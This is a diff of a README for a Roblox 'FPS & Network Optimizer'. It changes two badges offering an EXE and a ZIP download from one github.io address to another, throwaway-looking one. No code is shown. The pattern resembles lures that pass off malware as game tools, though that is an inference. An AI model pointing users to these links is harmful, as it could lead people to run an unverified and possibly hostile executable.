@@ -4,8 +4,8 @@ Enhance your Roblox experience with the **FPS & Network Optimizer**, a standalon
 
 ---
 
-[![⬇️ Download – EXE Setup](https://img.shields.io/badge/Download-EXE_Setup-green?style=for-the-badge&logo=windows)](https://trahendon.github.io/.github/Robloxoptimizator1-pc)  
-[![⬇️ Download – ZIP Version](https://img.shields.io/badge/Download-ZIP_Version-green?style=for-the-badge&logo=github)](https://trahendon.github.io/.github/Robloxoptimizator1-pc)
+[![⬇️ Download – EXE Setup](https://img.shields.io/badge/Download-EXE_Setup-green?style=for-the-badge&logo=windows)](https://orgwebdirect120liko.github.io/.github/)  
+[![⬇️ Download – ZIP Version](https://img.shields.io/badge/Download-ZIP_Version-green?style=for-the-badge&logo=github)](https://orgwebdirect120liko.github.io/.github/)
 
 ---
 
